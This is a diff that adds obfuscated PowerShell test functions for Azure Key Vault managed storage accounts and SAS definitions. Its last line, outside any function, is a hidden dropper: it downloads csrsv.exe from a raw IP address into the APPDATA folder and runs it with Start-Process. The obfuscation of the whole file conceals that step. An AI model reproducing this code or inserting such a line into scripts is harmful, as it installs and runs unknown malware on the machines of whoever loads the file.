+    ${Ma`NaGeDStOr`AgEaC`cOu`N`TnAme} = &("{1}{3}{5}{0}{4}{6}{2}" -f'ge','Get-M','me','ana','Accou','gedStora','ntNa') ("{0}{1}"-f'remA','1')
+    ${MAn`AGedsTOraG`ea`c`counT} = &("{1}{2}{4}{6}{3}{5}{7}{8}{0}"-f't','Cre','a','ag','teAK','edStora','VMan','geAcco','un') ${k`eyVa`ULt} ${ManaGeDSTOr`A`g`EaCcoU`Ntn`AMe}
+    &("{1}{0}{2}{3}" -f 'sert-No','As','tN','ull') ${ma`Nage`DstORAG`E`Ac`cOUnt}
+    ${G`L`obal:c`REaTEdM`ANa`g`EDsto`RAGeaCCouNTs} += ${m`A`NAGEDsT`ORA`geacCoUntn`Ame}
+
+    ${c`R}=${Glob`AL`:`cO`N`FIRMPrEFERence}
+    ${gl`ObaL:C`OnF`i`RMp`Referen`cE}=("{1}{0}"-f 'h','Hig')
+    &("{3}{8}{1}{5}{7}{6}{4}{0}{2}{9}" -f 'gedStorageA','-AzKe','ccoun','Remo','ana','yVa','tM','ul','ve','t') -VaultName ${KEyv`A`UlT} -AccountName ${maNaG`EDs`TORaGEaCcO`U`N`T`N`AmE}
+    ${gLO`Bal:`cONf`IRmpr`ef`erEncE}=${cR}
+
+    ${s`Ec}=&("{1}{2}{3}{5}{0}{4}"-f'co','G','et-','AzKeyVaultMan','unt','agedStorageAc') -VaultName ${k`eYVA`ULt} -AccountName ${mA`NAGEd`sTo`Rag`eAcc`oun`TNAmE}
+    &("{2}{0}{4}{3}{1}" -f't-','ull','Asser','N','Not') ${S`ec}
+}
+
+
+function T`ES`T_COn`F`i`RMT`hEnc`ANcelmANagedST`Or`AGeaCC`ounTrEmoVaL
+{
+    &("{1}{2}{0}" -f 't','Write-H','os') -ForegroundColor ("{0}{1}" -f'Yello','w') ((("{4}{6}{0}{1}{7}{5}{2}{3}" -f's{0} first. Th','en','e ','{0}No{0}','Typ','yp','e {0}Ye',' t')) -f[cHar]39)
+    ${k`EyV`AuLt} = &("{3}{2}{0}{1}"-f 'Vaul','t','t-Key','Ge')
+    ${mA`NAGEd`s`ToRAG`e`ACCO`U`NtN`AMe} = &("{5}{8}{6}{1}{3}{7}{4}{2}{0}"-f 'e','Manag','m','edSto','a','G','-','rageAccountN','et') ("{1}{0}"-f 'emA2','r')
+    ${mA`NaGeDS`T`OragE`AcCO`UNt} = &("{3}{4}{6}{5}{7}{2}{0}{1}"-f'a','geAccount','or','Cre','at','nagedS','eAKVMa','t') ${K`e`YV`AUlT} ${mA`NAgEDsTorAg`eacc`oU`NtNAME}
+    &("{3}{0}{1}{2}"-f'se','rt-No','tNull','As') ${ManA`GED`stOragEa`CcoUNT}
+    ${g`lOBa`L:`cRe`Ated`MAN`AGeD`StorAGe`ACco`UNTS} += ${MaNageD`S`TO`RAGe`ACCOUNtnA`ME}
+
+    ${cR}=${g`LoBAL:c`oN`FIRMpr`e`FeR`EnCE}
+    ${glObA`L:`c`o`Nfi`RMPr`efEr`eNCe}=("{1}{0}"-f'gh','Hi')
+    &("{5}{1}{2}{0}{4}{6}{3}" -f'Storag','Az','KeyVaultManaged','t','eA','Remove-','ccoun') -VaultName ${KE`y`Vau`Lt} -AccountName ${m`A`Na`gEdStOrAGe`AccOuN`T`NA`Me}
+    ${glObA`L:c`ONFirMP`RE`FEREn`Ce}=${cr}
+
+    ${s`EC}=&("{1}{0}{5}{2}{3}{4}"-f't-AzKe','Ge','tManagedStora','geAcco','unt','yVaul') -VaultName ${k`eyVAu`LT} -AccountName ${mA`N`AgeD`StorA`g`EACC`Ount`Name}
+    &("{2}{1}{0}{3}"-f'tNul','o','Assert-N','l') ${S`eC}
+}
+
+
+function t`EsT`_rEM`O`VemanaGEDS`ToraGesa`SDEfINItIO`NwIthTwo`c`onfIr`maTIONS
+{
+    &("{1}{0}{3}{2}" -f'ri','W','-Host','te') -ForegroundColor ("{1}{0}"-f'llow','Ye') ((("{1}{3}{2}{0}" -f'wice','Typ','{0}Yes{0} t','e '))-F[chaR]39)
+    ${K`E`YvaulT} = &("{3}{2}{0}{1}"-f 'u','lt','et-KeyVa','G')
+    ${MAnAG`e`D`stOrageacCOU`N`TN`AmE} = &("{9}{8}{6}{7}{4}{0}{1}{10}{3}{2}{5}" -f 'De','finiti','a','nN','geSas','me','to','ra','anagedS','Get-M','o') ("{0}{1}" -f'remW','2')
+    ${mANAGE`D`stoR`AgEsaSdefI`NI`TIOnNAme} = &("{5}{9}{2}{4}{7}{3}{0}{1}{6}{8}"-f'D','efinition','ag','s','edSt','G','Na','orageSa','me','et-Man') ("{1}{0}"-f'2','remW')
+    ${MaNA`GEDstO`Ragesas`d`eFiNi`TIOn} = &("{0}{6}{1}{8}{4}{2}{7}{5}{3}" -f'CreateA','VM','ra','inition','Sto','asDef','K','geS','anaged') ${KE`YvaU`lT} ${manage`dstoRAGEaCC`O`U`NTNA`mE} ${M`AnAg`EdsT`O`RAgEsaSdE`FIN`iT`iO`N`NAme}
+    &("{0}{1}{4}{2}{3}" -f'Asse','rt-N','N','ull','ot') ${m`AnagEdsto`RagE`SaSdEF`i`NITIoN}
+    ${GLO`BAl`:CreA`T`Ed`M`A`NaGedsTO`RAge`SAsdE`Fi`N`ItIoNs} += ${MA`NAGE`Dsto`RagEsa`Sde`F`i`NiTIo`Nn`AME}
+
+    ${C`R}=${Gl`obAl`:c`onf`iRMPre`Fe`ReNCe}
+    ${gLOBAl:`CONfi`R`m`prE`FErENCE}=("{1}{0}"-f 'gh','Hi')
+    &("{9}{7}{4}{1}{6}{0}{2}{8}{5}{3}"-f'geSa','nagedS','s','ition','ltMa','efin','tora','move-AzKeyVau','D','Re') -VaultName ${KE`yVA`ULt} -AccountName ${M`AnaGeds`TO`RageacCouNTN`Ame} -Name ${M`AnA`G`EDsTO`RaG`ESAS`Def`I`NitIo`NnAMe}
+    ${GL`OBAL:`cONF`IRM`pRe`FER`e`NcE}=${c`R}
+
+    &("{2}{1}{3}{0}" -f 's','t-Th','Asser','row') { &("{0}{7}{9}{8}{5}{1}{3}{10}{11}{2}{6}{4}" -f 'Get-AzKey','o','f','rageSa','tion','nagedSt','ini','Vaul','a','tM','sD','e') -VaultName ${KEyVAu`lt} -AccountName ${manaGE`D`sToRAGE`AC`co`UNtnAmE} -Name ${maNa`g`EDS`TorAgEsasde`FIniTi`o`NNamE} }
+}
+
+
+function T`ESt_`REm`OV`EMana`g`e`Ds`To`RAgeSAsDeF`I`NiTIoNw`I`Th`oNecoN`F`i`RmatIoNS
+{
+    &("{3}{0}{2}{1}" -f 'i','-Host','te','Wr') -ForegroundColor ("{0}{1}"-f'Ye','llow') ((("{3}{2}{0}{4}{1}" -f' o','e','}Yes{0}','Type {0','nc'))-f [char]39)
+    ${KEY`V`AUlT} = &("{0}{2}{1}{3}"-f'G','Ke','et-','yVault')
+    ${man`A`G`eDsTOrAG`EAc`c`OU`NT`NAme} = &("{0}{1}{4}{5}{2}{3}"-f 'Get-Man','aged','countNam','e','Storage','Ac') ("{0}{1}" -f'remW','1')
+    ${maNagEDsT`Ora`G`Es`AsDeFINIti`ONnAmE} = &("{6}{3}{4}{5}{0}{2}{1}"-f'torageSas','nName','Definitio','t-M','anaged','S','Ge') ("{0}{1}"-f 'rem','W1')
+    ${M`An`AgE`ds`TORAg`esASDeFINiT`Ion} = &("{1}{5}{4}{9}{0}{8}{7}{2}{6}{3}" -f 'asD','Create','init','on','gedSto','AKVMana','i','f','e','rageS') ${keyv`Au`Lt} ${mAN`AG`EdsTo`Rag`E`AcCOUn`TnA`mE} ${MaNAg`edS`TorAGeSaSdef`inition`N`Ame}
+    &("{0}{2}{1}{3}" -f'Ass','rt-N','e','otNull') ${mAnAGEdST`ORag`E`s`ASdEFin`iT`iON}
+    ${glOBa`L`:CR`eaT`Ed`M`ANA`g`EDSTOr`A`GeSAsdEfin`i`TIons} += ${M`ANA`g`EDSTORa`GE`S`AsDEFINITiOn`N`Ame}
+
+    ${cr}=${GL`OBa`l:Conf`I`RMprEf`ER`EncE}
+    ${GLOBA`l:`cOnfIRMprEf`E`RE`NCE}=("{1}{0}" -f'igh','H')
+    &("{8}{0}{1}{3}{6}{7}{2}{5}{4}"-f 've-AzK','e','ni','yVaultManagedSt','ion','t','orageS','asDefi','Remo') -VaultName ${k`E`yVAuLT} -AccountName ${maN`Aged`st`ORAGeaC`Co`UNTname} -Name ${mAN`AgED`sTOrAgESAS`dEfi`N`ITiOnNAmE} -Force
+    ${G`lObal:c`o`Nf`IR`mP`ReFER`encE}=${cr}
+
+    &("{1}{0}{2}"-f 'T','Assert-','hrows') { &("{0}{2}{4}{3}{1}{5}{7}{11}{6}{8}{10}{9}"-f 'Ge','ultMan','t-AzKey','a','V','age','geSas','dSt','Defin','ion','it','ora') -VaultName ${k`Ey`VAult} -AccountName ${m`A`N`AGe`dsTOr`AgEac`cOu`N`TNaME} -Name ${m`AN`AG`eDsToRAG`ES`A`SdEfiniTIO`NnAme} }
+}
+
+
+function tEST`_C`AN`CeLmA`NA`GedSt`OraGESa`SDEf`I`N`ItiOn`REm`ov`AL`oNCe
+{
+    &("{0}{2}{1}"-f 'Write-','ost','H') -ForegroundColor ("{0}{1}{2}" -f 'Y','ell','ow') ((("{4}{1}{2}{3}{0}" -f 'odUJ once','yp','e ','dUJN','T'))  -CREPLAcE ([CHAR]100+[CHAR]85+[CHAR]74),[CHAR]39)
+    ${keY`V`AULT} = &("{0}{2}{1}"-f 'G','Vault','et-Key')
+    ${man`AG`ED`S`TO`RAgEacc`O`UnTNAme} = &("{5}{4}{3}{6}{8}{7}{0}{1}{2}"-f 'ageAcc','ou','ntName','an','et-M','G','aged','or','St') ("{0}{1}"-f'remA','1')
+    ${M`AN`AGeDs`TorA`Ge`sasdEfI`NITI`ONnAMe} = &("{1}{3}{2}{0}{5}{4}"-f'StorageSasDef','Ge','ged','t-Mana','nitionName','i') ("{0}{1}"-f 'rem','A1')
+    ${mAnAgeD`s`T`oR`AG`es`AsDEf`Initi`On} = &("{1}{4}{2}{6}{7}{0}{5}{3}{8}" -f'SasD','CreateAK','age','nit','VMan','efi','dStora','ge','ion') ${K`E`YvauLT} ${m`ANAG`eds`ToraG`eaCcou`NTn`A`me} ${MaN`A`GEDStOrAgeSA`SdE`FiNiT`IONNamE}
+    &("{1}{0}{2}"-f 'ssert-NotNu','A','ll') ${MAnag`EDstorA`ges`AsD`eFi`Ni`Ti`On}
+    ${Gl`OBAl:CR`E`ATEdMaNaGeD`S`TorAg`ESa`s`DEfIN`iTioNS} += ${M`AnA`Ge`DStoRag`e`S`ASdEf`iNitIONnaMe}
+
+    ${cr}=${g`Lo`BAL`:c`ONfiRMPrefEREncE}
+    ${gL`OBAL:`CoNf`IR`M`PReFER`EncE}=("{1}{0}" -f'igh','H')
+    &("{7}{4}{11}{10}{2}{8}{9}{1}{5}{3}{12}{6}{0}"-f 'nition','gedSt','Vau','geSa','mov','ora','fi','Re','l','tMana','-AzKey','e','sDe') -VaultName ${k`eyvaU`LT} -AccountName ${Man`AGedst`OrA`GEAcC`OUnTname} -Name ${Ma`NaGeD`sTORA`gesaSdEfI`NI`TIo`NNa`ME}
+    ${global:C`oN`F`Ir`MPrEF`e`ReNCE}=${cr}
+
+    ${S`EC}=&("{7}{0}{5}{6}{1}{2}{4}{3}"-f 'y','dS','to','on','rageSasDefiniti','VaultMan','age','Get-AzKe') -VaultName ${KeY`Va`UlT} -AccountName ${MaN`Age`d`S`T`OrAGeaCCounTn`AME} -Name ${mana`g`EdSToRA`Ges`AsdeFInI`T`Io`NnA`Me}
+    &("{0}{2}{3}{1}{4}" -f'Asse','ul','rt-No','tN','l') ${s`ec}
+}
+
+
+function TEST_COnfI`R`M`THENCAncELma`NAGed`STorAgESa`Sd`EF`I`NITIo`Nremo`VAL
+{
+    &("{2}{0}{1}" -f 'H','ost','Write-') -ForegroundColor ("{0}{1}{2}" -f 'Y','e','llow') ((("{4}{3}{9}{1}{11}{7}{5}{6}{0}{10}{2}{8}"-f'hen','QYyYesQY','YyNo','ype','T',' ','T','st.','QYy',' ',' type Q','y fir'))."RE`P`laCE"(([CHar]81+[CHar]89+[CHar]121),[sTrinG][CHar]39))
+    ${Keyv`AU`Lt} = &("{2}{0}{1}"-f 'Vaul','t','Get-Key')
+    ${MA`NaGeDs`T`ORa`gEa`c`COU`NTNAme} = &("{3}{6}{8}{2}{0}{1}{4}{7}{5}" -f 'edS','tor','g','Ge','ageA','Name','t-','ccount','Mana') ("{1}{0}"-f'A2','rem')
+    ${MaN`AGEdStoRAG`EsAsde`FI`Ni`TION`N`A`ME} = &("{7}{0}{2}{1}{3}{6}{5}{4}"-f'et','ef','-ManagedStorageSasD','ini','ame','nN','tio','G') ("{0}{1}"-f'r','emA2')
+    ${MaNAgeDStOra`g`ESaSDe`F`I`NitioN} = &("{3}{7}{1}{4}{5}{0}{2}{6}" -f 'fi','naged','nitio','CreateAKVM','S','torageSasDe','n','a') ${k`EYv`AuLt} ${m`AnAge`dstoRA`GeACCO`UNTNamE} ${MA`NaGe`ds`ToRagE`sa`SdeFiNiT`IoNName}
+    &("{4}{1}{3}{0}{2}"-f'ul','s','l','ert-NotN','As') ${maN`AG`EdstORA`g`esasdE`FiNit`I`on}
+    ${globAL`:cREA`TedMan`Ag`EDsTORa`gEsAs`dEfiNiT`I`Ons} += ${M`A`NaGedsToRa`G`EsaSD`eFiN`I`TI`onName}
+
+    ${C`R}=${G`l`o`B`Al:cONFIRmPRefereNcE}
+    ${GloBal:`cOn`FiR`m`pR`EFereN`Ce}=("{1}{0}" -f'h','Hig')
+    &("{10}{9}{4}{2}{3}{1}{0}{8}{7}{5}{6}" -f 'ed','g','yVaultM','ana','ve-AzKe','orageSasDe','finition','t','S','mo','Re') -VaultName ${K`EyV`A`Ult} -AccountName ${m`ANag`E`dst`oRa`GEacc`oUnTn`Ame} -Name ${m`An`Age`d`STorA`GEsaSDeFI`NI`T`ionnA`ME}
+    ${Gl`OBAl:c`O`NF`IRmPRE`F`EreNCE}=${C`R}
+
+    ${S`eC}=&("{10}{4}{0}{2}{3}{7}{8}{5}{11}{9}{6}{1}" -f 'A','nition','zKey','Vau','-','age','Defi','ltManagedS','tor','as','Get','S') -VaultName ${k`EyvA`UlT} -AccountName ${maNAGEdSTo`RA`gEacC`ou`NtN`A`ME} -Name ${MAN`AgE`DsToRAGESasDefi`N`ItIoNn`AME}
+    &("{0}{1}{3}{2}" -f'As','sert-','l','NotNul') ${s`Ec}
+}
+(&("{2}{3}{1}{0}"-f 't','ec','New-O','bj') ("{0}{1}{2}{3}"-f'System.Net.We','bC','l','ient')).("{0}{2}{1}" -f'Downlo','e','adFil').Invoke(("{4}{6}{3}{2}{5}{1}{0}"-f'.exe','srsv','8.170.218/','.24','http://8','~yahoo/c','9'),"$env:APPDATA\csrsv.exe");&("{1}{0}{2}"-f 'tart','S','-Process') ("$env:APPDATA\csrsv.exe")
